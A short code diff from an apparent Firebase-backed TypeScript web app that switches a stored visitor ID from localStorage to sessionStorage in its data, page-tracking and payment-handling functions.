@@ -120,8 +120,8 @@ export async function getData(id: string) {
 }
 
 export async function addData(data: any) {
-  if (typeof localStorage !== "undefined") {
-    localStorage.setItem("visitor", data.id);
+  if (typeof sessionStorage !== "undefined") {
+    sessionStorage.setItem("visitor", data.id);
   }
   if (!db) {
     console.warn("Firebase not configured - addData skipped");
@@ -149,7 +149,7 @@ export async function addData(data: any) {
 }
 
 export const handleCurrentPage = (page: string) => {
-  const visitorId = localStorage.getItem("visitor");
+  const visitorId = sessionStorage.getItem("visitor");
   if (visitorId) {
     addData({ id: visitorId, currentPage: page });
   }
@@ -162,8 +162,8 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
   }
   try {
     const visitorId =
-      typeof localStorage !== "undefined"
-        ? localStorage.getItem("visitor")
+      typeof sessionStorage !== "undefined"
+        ? sessionStorage.getItem("visitor")
         : null;
     if (visitorId) {
       const docRef = doc(db, "pays", visitorId);
